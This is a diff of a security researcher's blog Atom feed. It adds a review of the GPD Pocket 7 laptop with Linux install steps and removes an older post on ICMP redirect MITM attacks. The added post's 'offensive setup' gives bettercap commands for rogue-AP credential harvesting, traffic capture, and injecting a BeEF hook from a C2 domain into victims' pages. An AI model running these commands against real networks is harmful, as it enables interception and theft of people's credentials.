@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.evilsocket.net/"/>
-  <updated>2017-08-11T14:28:47.027Z</updated>
+  <updated>2017-08-15T16:33:55.740Z</updated>
   <id>https://www.evilsocket.net/</id>
   
   <author>
@@ -14,6 +14,132 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup</title>
+    <link href="https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"/>
+    <id>https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/</id>
+    <published>2017-08-15T15:13:21.000Z</published>
+    <updated>2017-08-15T16:33:55.740Z</updated>
+    
+    <content type="html"><![CDATA[<p>It’s no secret I’ve been recently playing with the <a href="https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="external">GPD Pocket 7</a>, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the <a href="https://www.google.com/search?&amp;source=lnms&amp;tbm=isch&amp;q=open+zaurus+sl-c1000" target="_blank" rel="external">Sharp Zaurus</a> series. Considering that a <a href="https://twitter.com/evilsocket/status/896847606072127488" target="_blank" rel="external">lot of people were interested</a> I decided to write this post to share my impressions, installation procedure and configuration tips.</p>
+<p><img src="https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg" alt="gpd"></p>
+<a id="more"></a>
+<h3 id="Specs"><a href="#Specs" class="headerlink" title="Specs"></a>Specs</h3><p>Let’s start with the hardware specs of this sweet little thing:</p>
+<ul>
+<li>7-inch full-HD (1920×1200) IPS touch display</li>
+<li>Intel Atom x7-Z8750 CPU (Quad Core) @ 1.6GHz</li>
+<li>8GB RAM</li>
+<li>128GB eMMC</li>
+<li>7,000 mAh battery (12 hours battery life estimated)</li>
+<li>802.11ac WiFi</li>
+<li>Bluetooth 4.1</li>
+<li>1x USB 3.0 Type-C</li>
+<li>1x USB 3.0 Type-A</li>
+<li>micro HDMI</li>
+<li>3.5mm headphone jack</li>
+</ul>
+<p><strong>Not bad at all!</strong> right?</p>
+<h3 id="Installing-GNU-Linux"><a href="#Installing-GNU-Linux" class="headerlink" title="Installing GNU/Linux"></a>Installing GNU/Linux</h3><p>Despite they should start shipping the Ubuntu 16.04 models in a few days (?), I decided to buy the Windows version, which means I had to install GNU/Linux from scratch and overcome/fix several hardware issues … since I’m a good guy, let me share with you the correct procedure :D</p>
+<ol>
+<li>Download your GNU/Linux distribution ISO ( in my case, it was Ubuntu 17.04 ).</li>
+<li>Clone <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="external">this repository</a> and run the <code>bootstrap-iso.sh</code> script against the ISO file.</li>
+<li>Write the resulting <code>~/bootstrap.iso</code> file to an USB drive using UNetBootin or whatever you like.</li>
+<li>Plug the USB drive to your GPD, turn it on and press the <code>DEL</code> button to enter BIOS and boot from it.</li>
+</ol>
+<p>This will start the usual GNU/Linux installation procedure.</p>
+<p><strong>NOTE:</strong> Data on USB Type-C still does not work, but efforts are being made about it, we only need to wait.</p>
+<h3 id="Updating-custom-Kernel-and-stuff"><a href="#Updating-custom-Kernel-and-stuff" class="headerlink" title="Updating custom Kernel and stuff."></a>Updating custom Kernel and stuff.</h3><p>After installation and the routine system update, you might want to periodically update the fixes and custom kernel from the repository, in order to do so you should run the <code>gpd-update</code> script as root, this will take 2-3 hours since the kernel is going to be compiled on the device itself.</p>
+<p>If you are running Ubuntu 17.04 as me and are experiencing <a href="https://github.com/cawilliamson/ansible-gpdpocket/issues/49" target="_blank" rel="external">this issue</a>, you might want to do the following instead:</p>
+<p><strong>Make sure apt is not locked and you have internet connectivity first.</strong></p>
+<pre><code>sudo rm -rf /usr/src/ansible-gpdpocket
+sudo git clone https://github.com/cawilliamson/ansible-gpdpocket.git /usr/src/ansible-gpdpocket
+cd /usr/src/ansible-gpdpocket
+sudo git reset --hard origin/master
+</code></pre><p>Before you continue, edit the <code>roles/boot/tasks/debian.yml</code> file and <strong>remove this block</strong> from it:</p>
+<pre><code>- name: install intel-microcode (iso creation = no)
+  apt: name=intel-microcode
+  when: chroot == false
+  tags:
+  - boot
+</code></pre><p>( Don’t worry, you already have Intel microcode installed )</p>
+<p>And eventually start the update process itself:</p>
+<pre><code>sudo ANSIBLE_NOCOWS=1 ansible-playbook system.yml
+</code></pre><p>After the update is over, reboot and you’re ready to go :)</p>
+<h3 id="Getting-Offensive"><a href="#Getting-Offensive" class="headerlink" title="Getting Offensive"></a>Getting Offensive</h3><p>At this point, you have a quad core Intel cpu, GNU/Linux and an USB 3.0 port, I mean, imagination is the limit! </p>
+<p>Personally, I like to have an Anker Astro E7 powerbank connected to the USB Type-C and the hardware I need to the USB 3.0 port (maybe with some <a href="https://www.amazon.it/gp/product/B0192W3HX8/ref=oh_aui_detailpage_o00_s00?ie=UTF8&amp;psc=1" target="_blank" rel="external">USB 3 hub</a>, to have appropriate bandwidth, powered by the same powerbank), then I can attach pretty much whatever I want to it, including an Alfa antenna, an Ubertooth One (great also to have a 2.4Ghz portable spectrum analyzer!) or some SDR card (most of SDR applications will require the full bandwidth of the USB port, which means it’s unlikely you’ll be able to use something else at the same time).</p>
+<p>Here’s a very ugly PoC of what I mean, I’m still waiting for a decent USB hub to be delivered by Amazon:</p>
+<p><img src="https://pbs.twimg.com/media/DHI-InZXgAEmggO.jpg" alt="stuff"></p>
+<p>In its simplest form, my portable offensive configuration is:</p>
+<ul>
+<li>GPD powered by the aforementioned powerbank.</li>
+<li>Main WiFi card connected to my smartphone (which is tethering via WiFi AP) as upstream.</li>
+<li>Alfa AWUS036NHR 2000mW with a HUACAM HCM82 8dBi dualband antenna for rogue AP and packet injection.</li>
+<li>Sensepost MANA running in <code>simple-nat</code> mode.</li>
+<li>BetterCap for credentials harvesting, pcap capture and reporting.</li>
+</ul>
+<pre><code>sudo bettercap --no-spoofing --no-discovery -I YOUR_ALFA_INTERFACE -X
+</code></pre><p>Or, if you feel really evil, you can also have the HTTP proxy inject your BEEF hook to every page:</p>
+<pre><code>sudo bettercap ...same as before... --proxy-module injectjs --js-url http://your-beef-c2-domain/hook.js
+</code></pre><p>If you’ll make bettercap save everything to a pcap file, this file will contains the traffic of all the targets and it will potentially become very big, I suggest you to use the USB hub and attach an external drive as well. Then just make bettercap write to it with appropriate command line arguments for offline inspection and credentials harvesting.</p>
+<pre><code>sudo bettercap ...same... --sniffer-output /media/your/usbdrive/capture.pcap
+</code></pre><p>… GOODBYE WIFI PINEAPPLE! :D</p>
+<h3 id="Impressions-amp-Links"><a href="#Impressions-amp-Links" class="headerlink" title="Impressions &amp; Links"></a>Impressions &amp; Links</h3><p>TL;DR: This device is <strong>awesome</strong>, expensive, but still, <strong>awesome</strong>.</p>
+<h5 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h5><p>Yes the layout is a very weird displaced QWERTY and yes the keys are small … you’ll get used to it unless you have very big hands.</p>
+<h5 id="Battery-Life"><a href="#Battery-Life" class="headerlink" title="Battery Life"></a>Battery Life</h5><p>I didn’t try the battery life as I always use the powerbank (the USB devices are draining power, that would kill the internal 7000mAh battery), but people said they achieved <strong>3 hours of intense gaming</strong> on Windows, normal use on GNU/Linux should last quite long.</p>
+<h5 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h5><p>Great definition and the <strong>touchscreen</strong> helps a lot navigating the menu … actually this is the very first time I find a touch screen to be really useful on Linux :D</p>
+<h5 id="Mouse"><a href="#Mouse" class="headerlink" title="Mouse"></a>Mouse</h5><p>Yeah the “mouse” is crap, but usable … as I said, touchscreen FTW!</p>
+<h5 id="Price"><a href="#Price" class="headerlink" title="Price"></a>Price</h5><p>Expensive, from 500 to 600 USD … it’s a little nice toy but you’ll have to pay for it.</p>
+<h5 id="Speed-Usability"><a href="#Speed-Usability" class="headerlink" title="Speed / Usability"></a>Speed / Usability</h5><p>Despite being an Atom, the CPU works great, as long as you don’t spawn 1000000000 apps you’ll do just fine … I mean, if <a href="https://www.evilsocket.net/2016/03/31/how-to-build-your-own-rogue-gsm-bts-for-fun-and-profit/">you can run a rogue GSM BTS on a RPi</a>, this hardware is actually <strong>more than just fine</strong>.</p>
+<h5 id="Connectivity"><a href="#Connectivity" class="headerlink" title="Connectivity"></a>Connectivity</h5><p>Internal WiFi is super stable and has decent coverage, Bluetooth also works great.</p>
+<h5 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h5><p>Check …</p>
+<ul>
+<li>… <a href="https://reddit.com/r/GPDPocket/" target="_blank" rel="external">this</a> out to stay updated on mods and hacks …</li>
+<li>… <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="external">this</a> for custom kernel and fixes …</li>
+<li>… <a href="https://github.com/jwrdegoede/linux-sunxi" target="_blank" rel="external">this</a> for custom kernel developement …</li>
+<li>and <a href="https://indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="external">this</a> for official updates.</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;It’s no secret I’ve been recently playing with the &lt;a href=&quot;https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GPD Pocket 7&lt;/a&gt;, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the &lt;a href=&quot;https://www.google.com/search?&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;q=open+zaurus+sl-c1000&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Sharp Zaurus&lt;/a&gt; series. Considering that a &lt;a href=&quot;https://twitter.com/evilsocket/status/896847606072127488&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;lot of people were interested&lt;/a&gt; I decided to write this post to share my impressions, installation procedure and configuration tips.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg&quot; alt=&quot;gpd&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
+    
+      <category term="linux" scheme="https://www.evilsocket.net/tags/linux/"/>
+    
+      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
+    
+      <category term="wifi pentesting" scheme="https://www.evilsocket.net/tags/wifi-pentesting/"/>
+    
+      <category term="gpd pocket 7" scheme="https://www.evilsocket.net/tags/gpd-pocket-7/"/>
+    
+      <category term="gpd" scheme="https://www.evilsocket.net/tags/gpd/"/>
+    
+      <category term="wireless" scheme="https://www.evilsocket.net/tags/wireless/"/>
+    
+      <category term="sigint" scheme="https://www.evilsocket.net/tags/sigint/"/>
+    
+      <category term="sdr" scheme="https://www.evilsocket.net/tags/sdr/"/>
+    
+      <category term="rogue ap" scheme="https://www.evilsocket.net/tags/rogue-ap/"/>
+    
+      <category term="mana" scheme="https://www.evilsocket.net/tags/mana/"/>
+    
+      <category term="pentest" scheme="https://www.evilsocket.net/tags/pentest/"/>
+    
+      <category term="red teaming" scheme="https://www.evilsocket.net/tags/red-teaming/"/>
+    
+      <category term="hardware" scheme="https://www.evilsocket.net/tags/hardware/"/>
+    
+      <category term="equipment" scheme="https://www.evilsocket.net/tags/equipment/"/>
+    
+  </entry>
   
   <entry>
     <title>TLS, Server Name Indication and Why We Need to Encrypt It</title>
@@ -333,11 +459,11 @@ The jar is located at /data/data/de.robv.android.xposed.installer/bin/XposedBrid
     
       <category term="android" scheme="https://www.evilsocket.net/tags/android/"/>
     
+      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
+    
       <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
     
       <category term="apk" scheme="https://www.evilsocket.net/tags/apk/"/>
-    
-      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
     
       <category term="dex" scheme="https://www.evilsocket.net/tags/dex/"/>
     
@@ -1289,11 +1415,11 @@ routine, eventually it will output all the cleartexts I need!
     
       <category term="android" scheme="https://www.evilsocket.net/tags/android/"/>
     
+      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
+    
       <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
     
       <category term="apk" scheme="https://www.evilsocket.net/tags/apk/"/>
-    
-      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
     
       <category term="emulator" scheme="https://www.evilsocket.net/tags/emulator/"/>
     
@@ -1628,66 +1754,6 @@ MBTS ready
       <category term="proxy" scheme="https://www.evilsocket.net/tags/proxy/"/>
     
       <category term="vulnerability" scheme="https://www.evilsocket.net/tags/vulnerability/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BetterCap and the First REAL DoubleDirect ICMP Redirect Attack</title>
-    <link href="https://www.evilsocket.net/2016/01/10/bettercap-and-the-first-real-icmp-redirect-attack/"/>
-    <id>https://www.evilsocket.net/2016/01/10/bettercap-and-the-first-real-icmp-redirect-attack/</id>
-    <published>2016-01-10T12:56:22.000Z</published>
-    <updated>2016-01-10T13:11:34.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>The next release of <a href="http://www.bettercap.org/" target="_blank" rel="external">bettercap</a> will include a <a href="https://github.com/evilsocket/bettercap/blob/8d1467987935762a890871c7e792c32b7390df53/lib/bettercap/spoofers/icmp.rb" target="_blank" rel="external">new spoofer module</a> as an alternative to the default ARP spoofer.<br>The new module performs a <strong>fully automated</strong> and full duplex <strong>ICMP Redirect</strong> MITM attack, what my collegues at Zimperium discovered and <a href="https://blog.zimperium.com/doubledirect-zimperium-discovers-full-duplex-icmp-redirect-attacks-in-the-wild/" target="_blank" rel="external">called a</a> <strong>DoubleDirect</strong> attack.</p>
-<p><strong>BetterCap will be the very first MITM framework to have this feature 100% working without any additional spoofers.</strong></p>
-<a id="more"></a>
-<p>If you’re thinking about ettercap ICMP spoofer which was released (I think) years ago, let me remind you what its <a href="http://www.irongeek.com/i.php?page=backtrack-3-man/ettercap" target="_blank" rel="external">documentation</a> says about it:</p>
-<pre><code>Obviously you have to be able to sniff all the traffic. If you are on a switch you have
-to use a different mitm attack such as arp poisoning.
-</code></pre><p>So yeah, unless you’re <strong>already</strong> able to sniff network traffic ( in which case, why would you even need to do a MITM attack?!?!?! ), <strong>ettercap’s ICMP module is completely useless</strong>.</p>
-<p><img src="/images/2016/01/photo.jpg" alt="lulz"></p>
-<p>On the other hand, <a href="https://github.com/byt3bl33d3r/MITMf/" target="_blank" rel="external">MITMf</a> is not that much better, if you look closely at <a href="https://github.com/byt3bl33d3r/MITMf/blob/d0b4fd66fafe9b3197e66b71dcc24e5e64f10eb3/core/poisoners/ICMP.py" target="_blank" rel="external">its code</a>, you will find that the ICMP spoofer only does this:</p>
-<pre><code>def build_icmp(self):
-   pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5,code=1, gw=self.ip_address) /\
-              IP(src=self.target, dst=self.gateway)/UDP()
-
-   return pkt
-</code></pre><p>Which basically will only reroute traffic to the gateway.</p>
-<p><img src="/images/2016/01/Meme-derp.jpg" alt="derp"></p>
-<p>In order to have a <strong>real</strong> and <strong>full duplex</strong> MITM using ICMP Redirect packets, you have to reroute the gateway and every other address that the target/victim is requesting, which is why I used<br>a <strong>DNS</strong> watcher thread just like described on Zimperium’s blog post.</p>
-<p><img src="/images/2016/01/papel-de-parede-meme-freddie-mercury-136608662.jpg" alt="imsexy"></p>
-<p>So stay tuned guys, the next release is close!</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;The next release of &lt;a href=&quot;http://www.bettercap.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;bettercap&lt;/a&gt; will include a &lt;a href=&quot;https://github.com/evilsocket/bettercap/blob/8d1467987935762a890871c7e792c32b7390df53/lib/bettercap/spoofers/icmp.rb&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;new spoofer module&lt;/a&gt; as an alternative to the default ARP spoofer.&lt;br&gt;The new module performs a &lt;strong&gt;fully automated&lt;/strong&gt; and full duplex &lt;strong&gt;ICMP Redirect&lt;/strong&gt; MITM attack, what my collegues at Zimperium discovered and &lt;a href=&quot;https://blog.zimperium.com/doubledirect-zimperium-discovers-full-duplex-icmp-redirect-attacks-in-the-wild/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;called a&lt;/a&gt; &lt;strong&gt;DoubleDirect&lt;/strong&gt; attack.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;BetterCap will be the very first MITM framework to have this feature 100% working without any additional spoofers.&lt;/strong&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
-    
-      <category term="icmp" scheme="https://www.evilsocket.net/tags/icmp/"/>
-    
-      <category term="icmp redirect" scheme="https://www.evilsocket.net/tags/icmp-redirect/"/>
-    
-      <category term="double direct" scheme="https://www.evilsocket.net/tags/double-direct/"/>
-    
-      <category term="doubledirect" scheme="https://www.evilsocket.net/tags/doubledirect/"/>
-    
-      <category term="zimperium" scheme="https://www.evilsocket.net/tags/zimperium/"/>
-    
-      <category term="spoofing" scheme="https://www.evilsocket.net/tags/spoofing/"/>
-    
-      <category term="spoofer" scheme="https://www.evilsocket.net/tags/spoofer/"/>
-    
-      <category term="icmp spoofing" scheme="https://www.evilsocket.net/tags/icmp-spoofing/"/>
-    
-      <category term="routing" scheme="https://www.evilsocket.net/tags/routing/"/>
-    
-      <category term="routing table" scheme="https://www.evilsocket.net/tags/routing-table/"/>
     
   </entry>
   
